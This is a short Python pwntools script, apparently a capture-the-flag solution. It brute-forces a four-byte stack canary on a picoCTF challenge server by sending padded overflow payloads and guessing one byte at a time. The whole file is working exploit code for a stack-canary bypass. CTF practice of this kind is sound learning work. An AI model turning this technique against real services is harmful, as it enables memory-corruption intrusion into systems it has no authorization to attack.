from pwn import *

# --- CONFIG ---
host = 'saturn.picoctf.net'
port = 56484  
# --------------

found_canary = b""

for i in range(1, 5):
    print(f"Finding byte {i}...")
    for guess in range(256):
        try:
            io = remote(host, port)
            io.sendline(str(64 + i).encode())
            
            io.recv(timeout=0.2)
            payload = b"A" * 64 + found_canary + bytes([guess])
            io.send(payload)
            
            result = io.recvall(timeout=0.5)
            
            if b"Ok" in result:
                found_canary += bytes([guess])
                print(f"[!] Byte {i} found: {bytes([guess])} ({hex(guess)})")
                io.close()
                break
            
            io.close()
        except Exception:
            io.close()

print(f"\nFinal Canary: {found_canary.decode('latin-1')}")